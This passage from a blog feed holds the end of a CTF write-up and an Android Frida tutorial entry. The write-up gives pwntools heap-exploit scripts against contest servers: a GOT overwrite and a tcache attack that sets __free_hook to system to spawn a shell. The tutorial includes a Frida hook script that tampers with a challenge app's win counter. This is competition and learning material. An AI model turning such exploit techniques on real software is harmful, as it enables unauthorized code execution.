class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">'arm'</span></span><br><span class="line">one = [<span class="number">0x4F438</span>,<span class="number">0x2F9AC</span>,<span class="number">0x35A80</span>,<span class="number">0x50170</span>,<span class="number">0x515AC</span>]</span><br><span class="line"><span class="comment">#p = process(["qemu-arm", "-g", "2333", "-L", "./arm", "./a.out"])</span></span><br><span class="line"><span class="comment">#p = gdb.debug("./a.out",'b *0x1058C')</span></span><br><span class="line">p = remote(<span class="string">"121.36.58.215"</span>,<span class="string">"1337"</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">main_got = <span class="number">0x2100C</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,data)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"&gt;&gt;&gt; "</span>)</span><br><span class="line">p.sendline(<span class="string">"2"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Length:"</span>)</span><br><span class="line">p.sendline(str(size))</span><br><span class="line">p.recvuntil(<span class="string">"Tag:"</span>)</span><br><span class="line">p.sendline(data)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,size,data)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"&gt;&gt;&gt; "</span>)</span><br><span class="line">p.sendline(<span class="string">"3"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Index:"</span>)</span><br><span class="line">p.sendline(str(index))</span><br><span class="line">p.recvuntil(<span class="string">"Length:"</span>)</span><br><span class="line">p.sendline(str(size))</span><br><span class="line">p.recvuntil(<span class="string">"Tag:"</span>)</span><br><span class="line">p.sendline(data)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"&gt;&gt;&gt; "</span>)</span><br><span class="line">p.sendline(<span class="string">"4"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Tag:"</span>)</span><br><span class="line">p.sendline(str(index))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"&gt;&gt;&gt; "</span>)</span><br><span class="line">p.sendline(<span class="string">"1"</span>)</span><br><span class="line">add(<span class="number">0x8</span>,<span class="string">'aaa'</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x8</span>,<span class="string">'aaa'</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">'ccc'</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x11</span>,<span class="string">'aaa'</span>)<span class="comment">#3</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x8</span>,<span class="string">'a'</span>)<span class="comment">#0</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x40</span>,<span class="string">'a'</span>*<span class="number">0x8</span>+p32(<span class="number">0</span>)+p32(<span class="number">0x119</span>)+p32(<span class="number">0x22002</span>))</span><br><span class="line">add(<span class="number">0x8</span>,<span class="string">'a'</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x8</span>,<span class="string">'dddd'</span>)<span class="comment">#4</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">"4 : "</span>)</span><br><span class="line">libc = u32(p.recv(<span class="number">4</span>)) <span class="number">-0x9A8EC</span></span><br><span class="line"><span class="keyword">print</span> hex(libc)</span><br><span class="line">add(<span class="number">0x8</span>,<span class="string">'a'</span>)<span class="comment">#0</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x40</span>,<span class="string">'a'</span>*<span class="number">0x8</span>+p32(<span class="number">0</span>)+p32(<span class="number">0x11</span>)+p32(<span class="number">0x22</span>)+p32(<span class="number">0</span>))</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x40</span>,<span class="string">'a'</span>*<span class="number">0x8</span>+p32(<span class="number">0</span>)+p32(<span class="number">0x11</span>)+p32(<span class="number">0x2107c</span><span class="number">-2</span>)+p32(<span class="number">0</span>))</span><br><span class="line">add(<span class="number">0x8</span>,<span class="string">'/bin/sh\x00'</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x8</span>,<span class="string">'\x00'</span>*<span class="number">0x8</span>)<span class="comment">#4</span></span><br><span class="line">edit(<span class="number">4</span>,<span class="number">0x10</span>,<span class="string">'\x00'</span>*<span class="number">0x8</span>+p32(<span class="number">0x20</span>)+p32(<span class="number">0x21038</span>))</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x10</span>,p32(libc+<span class="number">0x51800</span>))</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="of"><a href="#of" class="headerlink" title="of"></a>of</h2><p>比较ez的一道堆题，不过感觉跟环境有关系，本地测试的时候free后cookie值会被更改，而远程倒不会，所以直接去掉这方面的验证。</p><p>题目比较简单，存在UAF漏洞，并且可以show/edit等操作，ubuntu18.04的环境。</p><h3 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h3><p>首先填满tcache，从而leak出libc，接着利用tcache直接申请到free_hook，改为system就能getshell了。</p><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p = process("./of")</span></span><br><span class="line">p = remote(<span class="string">"121.36.74.70"</span>,<span class="string">"9999"</span>)</span><br><span class="line">one = [<span class="number">0x4f2c5</span>,<span class="number">0x4f322</span>,<span class="number">0x10a38c</span>]</span><br><span class="line"><span class="comment">#context.terminal = ['tmux','splitw','-h']</span></span><br><span class="line">libc = ELF(<span class="string">"./of"</span>).libc</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(index)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"Your choice: "</span>)</span><br><span class="line">p.sendline(<span class="string">"1"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Index: "</span>)</span><br><span class="line">p.sendline(str(index))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,data)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"Your choice: "</span>)</span><br><span class="line">p.sendline(<span class="string">"2"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Index: "</span>)</span><br><span class="line">p.sendline(str(index))</span><br><span class="line">p.recvuntil(<span class="string">"Content: "</span>)</span><br><span class="line">p.sendline(data)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"Your choice: "</span>)</span><br><span class="line">p.sendline(<span class="string">"3"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Index: "</span>)</span><br><span class="line">p.sendline(str(index))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"Your choice: "</span>)</span><br><span class="line">p.sendline(<span class="string">"4"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Index: "</span>)</span><br><span class="line">p.sendline(str(index))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">9</span>):</span><br><span class="line">add(i)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">free(i)</span><br><span class="line">show(<span class="number">7</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Content: "</span>)</span><br><span class="line">libc.address = u64(p.recv(<span class="number">6</span>)+<span class="string">'\x00\x00'</span>) - <span class="number">0x3EBCA0</span></span><br><span class="line">print(hex(libc.address))</span><br><span class="line">edit(<span class="number">6</span>,p64(libc.sym[<span class="string">'__free_hook'</span>]))</span><br><span class="line">add(<span class="number">0</span>)</span><br><span class="line">print(hex(libc.sym[<span class="string">'system'</span>]))</span><br><span class="line">print(hex(libc.sym[<span class="string">'__free_hook'</span>]))</span><br><span class="line">add(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">1</span>,p64(libc.sym[<span class="string">'system'</span>]))</span><br><span class="line">edit(<span class="number">8</span>,<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;2020第五空间线上赛WP&quot;&gt;&lt;a href=&quot;#2020第五空间线上赛WP&quot; class=&quot;headerlink&quot; title=&quot;2020第五空间线上赛WP&quot;&gt;&lt;/a&gt;2020第五空间线上赛WP&lt;/h1&gt;&lt;h2 id=&quot;loop&quot;&gt;&lt;a href=&quot;#loop&quot;
      
    
    </summary>
    
    
      <category term="WP" scheme="https://nuoye-blog.github.io/categories/WP/"/>
    
    
      <category term="ctf" scheme="https://nuoye-blog.github.io/tags/ctf/"/>
    
      <category term="WP" scheme="https://nuoye-blog.github.io/tags/WP/"/>
    
  </entry>
  
  <entry>
    <title>Android-day15</title>
    <link href="https://nuoye-blog.github.io/2020/06/12/10ee5bfb/"/>
    <id>https://nuoye-blog.github.io/2020/06/12/10ee5bfb/</id>
    <published>2020-06-12T03:30:00.000Z</published>
    <updated>2020-06-12T03:36:53.218Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>《Android应用安全防护和逆向分析》这本书也快速过完了（好像略了很多，但问题不大，只是为了了解而已）。理论方面暂时就这样了，接下来打算刷刷攻防世界的题，学习Frida，还有再看看时间能不能学下fuzzing技术（感觉内容挺多，慢慢来，暂定这三个，争取一个月内完成）。</p><h1 id="Frida"><a href="#Frida" class="headerlink" title="Frida"></a>Frida</h1><p>Frida是个轻量级so级别的hook框架，它可以帮助逆向人员对指定的进程的so模块进行分析。它主要提供了功能简单的python接口和功能丰富的js接口，使得hook函数和修改so编程化，值得一提的是接口中包含了主控端与目标进程的交互接口，由此我们可以即时获取信息并随时进行修改。使用frida可以获取进程的信息（模块列表，线程列表，库导出函数），可以拦截指定函数和调用指定函数，可以注入代码，总而言之，使用frida我们可以对进程模块进行手术刀式剖析。</p><p>它主要的工作方式是将脚本库注入到目标进程，在目标进程执行脚本。这里需要注意的是，它是将脚本库注入到已经启动的进程，但并不是说，对于进程初始化所做的动作，frida无能为力，frida提供了一个接口spawn，可以启动并暂时挂起进程，然后待我们布置好hook代码后再恢复进程运行。</p><p>除了用于脚本编程的接口外，frida还提供了一些简单的工具，比如查看进程列表，追踪某个库函数等。分别是：frida-trace，frida-ps，frida，frida-discover。（相应源码地址：<a href="https://github.com/frida/frida-python）" target="_blank" rel="noopener">https://github.com/frida/frida-python）</a></p><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>win10</p><p>python 3.8</p><p>pip version 19.2.3</p><p>Frida官网：<a href="https://www.frida.re/" target="_blank" rel="noopener">https://www.frida.re/</a></p><p>Frida源码：<a href="https://github.com/frida" target="_blank" rel="noopener">https://github.com/frida</a></p><p>Frida下载：<a href="https://github.com/frida/frida/releases" target="_blank" rel="noopener">https://github.com/frida/frida/releases</a></p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>首先安装python和pip，并且安装：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install frida-tools</span><br></pre></td></tr></table></figure><p>下载frida，这里因为是用x86的32位模拟器，所以下载<a href="https://github.com/frida/frida/releases/download/12.9.7/frida-server-12.9.7-android-x86.xz" target="_blank" rel="noopener">frida-server-12.9.7-android-x86.xz</a>。然后将其用adb push进手机，赋予运行权限并运行。</p><p>测试：运行后在windows下的dos界面输入<code>frida-ps -U</code>显示当前进程则完成安装。</p><h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><p><a href="https://frida.re/docs/examples/android/" target="_blank" rel="noopener">出处</a></p><p>一个简单地石头剪刀布app，需要赢1000次才能获得flag。jeb中代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">Activity</span> <span class="keyword">implements</span> <span class="title">View</span>$<span class="title">OnClickListener</span> </span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">com</span>.<span class="title">example</span>.<span class="title">seccon2015</span>.<span class="title">rock_paper_scissors</span>.<span class="title">MainActivity</span>$1 <span class="keyword">implements</span> <span class="title">Runnable</span> </span>&#123;</span><br><span class="line">        com.example.seccon2015.rock_paper_scissors.MainActivity$<span class="number">1</span>(MainActivity arg1) &#123;</span><br><span class="line">            MainActivity.<span class="keyword">this</span> = arg1;</span><br><span class="line">            <span class="keyword">super</span>();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            View v0 = MainActivity.<span class="keyword">this</span>.findViewById(<span class="number">0x7F0C0052</span>);</span><br><span class="line">            <span class="keyword">if</span>(MainActivity.<span class="keyword">this</span>.n - MainActivity.<span class="keyword">this</span>.m == <span class="number">1</span>) &#123;</span><br><span class="line">                ++MainActivity.<span class="keyword">this</span>.cnt;</span><br><span class="line">                ((TextView)v0).setText(<span class="string">"WIN! +"</span> + String.valueOf(MainActivity.<span class="keyword">this</span>.cnt));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(MainActivity.<span class="keyword">this</span>.m - MainActivity.<span class="keyword">this</span>.n == <span class="number">1</span>) &#123;</span><br><span class="line">                MainActivity.<span class="keyword">this</span>.cnt = <span class="number">0</span>;</span><br><span class="line">                ((TextView)v0).setText(<span class="string">"LOSE +0"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(MainActivity.<span class="keyword">this</span>.m == MainActivity.<span class="keyword">this</span>.n) &#123;</span><br><span class="line">                ((TextView)v0).setText(<span class="string">"DRAW +"</span> + String.valueOf(MainActivity.<span class="keyword">this</span>.cnt));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(MainActivity.<span class="keyword">this</span>.m &lt; MainActivity.<span class="keyword">this</span>.n) &#123;</span><br><span class="line">                MainActivity.<span class="keyword">this</span>.cnt = <span class="number">0</span>;</span><br><span class="line">                ((TextView)v0).setText(<span class="string">"LOSE +0"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                ++MainActivity.<span class="keyword">this</span>.cnt;</span><br><span class="line">                ((TextView)v0).setText(<span class="string">"WIN! +"</span> + String.valueOf(MainActivity.<span class="keyword">this</span>.cnt));</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="number">1000</span> == MainActivity.<span class="keyword">this</span>.cnt) &#123;</span><br><span class="line">                ((TextView)v0).setText(<span class="string">"SECCON&#123;"</span> + String.valueOf((MainActivity.<span class="keyword">this</span>.cnt + MainActivity.<span class="keyword">this</span>.calc()) * <span class="number">107</span>) + <span class="string">"&#125;"</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            MainActivity.<span class="keyword">this</span>.flag = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Button P;</span><br><span class="line">    Button S;</span><br><span class="line">    <span class="keyword">int</span> cnt;</span><br><span class="line">    <span class="keyword">int</span> flag;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Handler handler;</span><br><span class="line">    <span class="keyword">int</span> m;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    Button r;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Runnable showMessageTask;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.loadLibrary(<span class="string">"calc"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">MainActivity</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>();</span><br><span class="line">        <span class="keyword">this</span>.cnt = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">this</span>.handler = <span class="keyword">new</span> Handler();</span><br><span class="line">        <span class="keyword">this</span>.showMessageTask = <span class="keyword">new</span> com.example.seccon2015.rock_paper_scissors.MainActivity$<span class="number">1</span>(<span class="keyword">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">native</span> <span class="keyword">int</span> <span class="title">calc</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View arg11)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> v9 = <span class="number">3</span>;</span><br><span class="line">        <span class="keyword">int</span> v8 = <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">this</span>.flag != <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">this</span>.flag = <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">this</span>.findViewById(<span class="number">0x7F0C0052</span>).setText(<span class="string">""</span>);</span><br><span class="line">            View v2 = <span class="keyword">this</span>.findViewById(<span class="number">0x7F0C0050</span>);</span><br><span class="line">            View v3 = <span class="keyword">this</span>.findViewById(<span class="number">0x7F0C0051</span>);</span><br><span class="line">            <span class="keyword">this</span>.m = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">this</span>.n = <span class="keyword">new</span> Random().nextInt(v9);</span><br><span class="line">            String[] v1 = <span class="keyword">new</span> String[v9];</span><br><span class="line">            v1[<span class="number">0</span>] = <span class="string">"CPU: Paper"</span>;</span><br><span class="line">            v1[<span class="number">1</span>] = <span class="string">"CPU: Rock"</span>;</span><br><span class="line">            v1[v8] = <span class="string">"CPU: Scissors"</span>;</span><br><span class="line">            ((TextView)v3).setText(v1[<span class="keyword">this</span>.n]);</span><br><span class="line">            <span class="keyword">if</span>(arg11 == <span class="keyword">this</span>.P) &#123;</span><br><span class="line">                ((TextView)v2).setText(<span class="string">"YOU: Paper"</span>);</span><br><span class="line">                <span class="keyword">this</span>.m = <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(arg11 == <span class="keyword">this</span>.r) &#123;</span><br><span class="line">                ((TextView)v2).setText(<span class="string">"YOU: Rock"</span>);</span><br><span class="line">                <span class="keyword">this</span>.m = <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(arg11 == <span class="keyword">this</span>.S) &#123;</span><br><span class="line">                ((TextView)v2).setText(<span class="string">"YOU: Scissors"</span>);</span><br><span class="line">                <span class="keyword">this</span>.m = v8;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">this</span>.handler.postDelayed(<span class="keyword">this</span>.showMessageTask, <span class="number">1000</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle arg2)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(arg2);</span><br><span class="line">        <span class="keyword">this</span>.setContentView(<span class="number">0x7F040018</span>);</span><br><span class="line">        <span class="keyword">this</span>.P = <span class="keyword">this</span>.findViewById(<span class="number">0x7F0C004D</span>);</span><br><span class="line">        <span class="keyword">this</span>.S = <span class="keyword">this</span>.findViewById(<span class="number">0x7F0C004F</span>);</span><br><span class="line">        <span class="keyword">this</span>.r = <span class="keyword">this</span>.findViewById(<span class="number">0x7F0C004E</span>);</span><br><span class="line">        <span class="keyword">this</span>.P.setOnClickListener(((View$OnClickListener)<span class="keyword">this</span>));</span><br><span class="line">        <span class="keyword">this</span>.r.setOnClickListener(((View$OnClickListener)<span class="keyword">this</span>));</span><br><span class="line">        <span class="keyword">this</span>.S.setOnClickListener(((View$OnClickListener)<span class="keyword">this</span>));</span><br><span class="line">        <span class="keyword">this</span>.flag = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>不难得出cnt是赢的次数，n-m==1即算我们赢。</p><p>这样只需要修改cnt为999，并且让n-m==1成立，即可打印出flag。</p><p>hook代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> frida, sys</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">on_message</span><span class="params">(message, data)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> message[<span class="string">'type'</span>] == <span class="string">'send'</span>:</span><br><span class="line">        print(<span class="string">"[*] &#123;0&#125;"</span>.format(message[<span class="string">'payload'</span>]))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(message)</span><br><span class="line"></span><br><span class="line">jscode = <span class="string">"""</span></span><br><span class="line"><span class="string">Java.perform(function () &#123;</span></span><br><span class="line"><span class="string">  // Function to hook is defined here</span></span><br><span class="line"><span class="string">  var MainActivity = Java.use('com.example.seccon2015.rock_paper_scissors.MainActivity');</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  // Whenever button is clicked</span></span><br><span class="line"><span class="string">  var onClick = MainActivity.onClick;</span></span><br><span class="line"><span class="string">  onClick.implementation = function (v) &#123;</span></span><br><span class="line"><span class="string">    // Show a message to know that the function got called</span></span><br><span class="line"><span class="string">    send('onClick');</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    // Call the original onClick handler</span></span><br><span class="line"><span class="string">    onClick.call(this, v);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    // Set our values after running the original onClick handler</span></span><br><span class="line"><span class="string">    this.m.value = 0;</span></span><br><span class="line"><span class="string">    this.n.value = 1;</span></span><br><span class="line"><span class="string">    this.cnt.value = 999;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    // Log to the console that it's done, and we should have the flag!</span></span><br><span class="line"><span class="string">    console.log('Done:' + JSON.stringify(this.cnt));</span></span><br><span class="line"><span class="string">  &#125;;</span></span><br><span class="line"><span class="string">&#125;);</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line">process = frida.get_usb_device().attach(<span class="string">'com.example.seccon2015.rock_paper_scissors'</span>)</span><br><span class="line">script = process.create_script(jscode)</span><br><span class="line">script.on(<span class="string">'message'</span>, on_message)</span><br><span class="line">print(<span class="string">'[*] Running CTF'</span>)</span><br><span class="line">script.load()</span><br><span class="line">sys.stdin.read()</span><br></pre></td></tr></table></figure><p>直接python运行该脚本即可。</p><p>其中<code>onClick.call(this, v);</code>是JavaScript中的用法，代表用该onClick代替this（也就是将原本的函数载入）。（参考：<a href="https://blog.csdn.net/qq_35810838/article/details/87824081）" target="_blank" rel="noopener">https://blog.csdn.net/qq_35810838/article/details/87824081）</a></p><p>接着再修改n, m, cnt的值即可。并且由于是多线程，所以运行一次即可完成。</p><p>关于Frida的api介绍可翻阅官方文档。</p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p>Frida  <a href="https://tool.pediy.com/index-detail-188.htm" target="_blank" rel="noopener">https://tool.pediy.com/index-detail-188.htm</a></p><p>[原创]Frida从入门到入门—安卓逆向菜鸟的frida食用说明-『Android安全』-看雪安全论坛  <a href="https://bbs.pediy.com/thread-226846.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-226846.htm</a></p><p>Android | Frida • A world-class dynamic instrumentation framework  <a href="https://frida.re/docs/examples/android/" target="_blank" rel="noopener">https://frida.re/docs/examples/android/</a></p><p>JavaScript API | Frida • A world-class dynamic instrumentation framework  <a href="https://frida.re/docs/javascript-api/" target="_blank" rel="noopener">https://frida.re/docs/javascript-api/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;《Android应用安全防护和逆向分析》这本书也快速过完了（好像略了很多，但问题不大，只是为了了解而已）。理论方面暂时就这样了，接下来打算刷
      
    
    </summary>
    
    
      <category term="Android" scheme="https://nuoye-blog.github.io/categories/Android/"/>
    
    
      <category term="Android" scheme="https://nuoye-blog.github.io/tags/Android/"/>
    
      <category term="开发" scheme="https://nuoye-blog.github.io/tags/%E5%BC%80%E5%8F%91/"/>
    
